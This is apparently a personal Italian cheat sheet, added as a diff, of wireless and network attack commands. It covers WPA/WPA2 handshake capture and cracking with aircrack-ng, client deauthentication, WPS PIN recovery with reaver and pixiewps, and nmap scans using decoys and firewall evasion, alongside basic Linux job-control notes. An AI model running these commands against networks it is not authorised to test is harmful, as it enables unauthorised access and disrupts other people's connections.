@@ -1,0 +1,99 @@
+MAC => macchanger
+Prima di air replay/dump/crack disabilitare NetworkManager => 
+	systemtcl stop/disable NetworkManager
+	service NetworkManager stop 
+
+apt-cache search  <query>
+
+built-in wordlist =>  /usr/share/wordlist 
+
+CHECK WPS => wash -i [interfaccia]
+ 
+
+Crack WPA/WPA2:
+
+--------------------------------------------------------------------------------------------------------
+airmon-ng => lista tutte le cards wireless che supportano la monitor mode
+
+airmon-ng start [interface] => avvia modalità monitor
+
+airodump-ng [monitor] => mostra tutte le reti wireless
+
+airodump-ng -c [channel] --bssid [BSSID] -w [save-path] [monitor] => monitora il network bersaglio catturando informazioni specifiche
+
+aireplay -ng -0 2 -a [router BSSID] -c [client BSSID] [monitor] => avvia la de-autenticazione del client, senza specifica il client de-autentica in broadcast. (-0 2) indica la deauth mode e 2 il numero dei pacchetti.
+
+Aircrack On Hash With WordList:
+aircrack-ng -a2 -b [router bssid] -w [path wordlist] [path .cap file]
+
+Aircrack On Hash With Crunch:
+crunch | aircrack-ng  
+
+--------------------------------------------------------------------------------------------------------
+
+wifite -wpa
+
+--------------------------------------------------------------------------------------------------------
+
+Reaver -i [monitor] -b [BSSID] -vv -S -c [AP Channel] => -vv è la modalità verbosa 
+
+Ottengo gli hash ed eseguo:
+
+pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>
+
+Se un router è vulnerabile pixiewps ritorna il PIN WPS
+
+reaver -i [monitor] -vv -S -b [BSSID] -c [canale] --pin=[PIN]
+
+-------------------------------------------------------------------------------------------------------
+
+NMAP:
+
+nmap -sS -sV -vv -n -Pn -T5 ip/netmask -p80  
+
+nmap 192.168.89.191 -p25-150 => ip range + port range
+
+nmap 192.168.89.0/24 -p80 => subnet scanning
+
+nmap -sS 192.168.89.191 -D 10.0.0.1,10.0.0.2,10.0.0.4 => -D hide ip passando per altri ips
+
+nmap -sS -P0 192.168.89.191 => evasione firewall se bloccano il ping
+
+nmap -V 192.168.89.191 => info versione 
+
+nmap -sU 192.168.89.191 => UDP SCAN
+
+nmap -sU --reason 192.168.89.191 => --reason torna i motivi di uno stato di una porta
+
+nmap -iL scanlist.txt => utilizzo di una lista
+
+nmap -sS 192.168.89.191 -oN portscan => output su file
+
+
+-------------------------------------------------------------------------------------------------------
+
+
+While running a job you can 	Shortcut
+suspend a job 			ctrl -z
+terminate a job 		ctrl -c
+
+
+Function 					Command
+Move a suspended job to the foreground 		fg
+Continue a suspended job in the background 	bg
+List all jobs 					jobs
+Kill a job (%N where N is the job number) 	kill %N && fg
+Start a job directly in the background 		command &
+
+
+
+COMANDI VARI
+
+ps -fe
+ps aux
+ps ax
+(mysqladmin + mysql + mysqld)
+clamscan
+
+
+-------------------------------------------------------------------------------------------------------
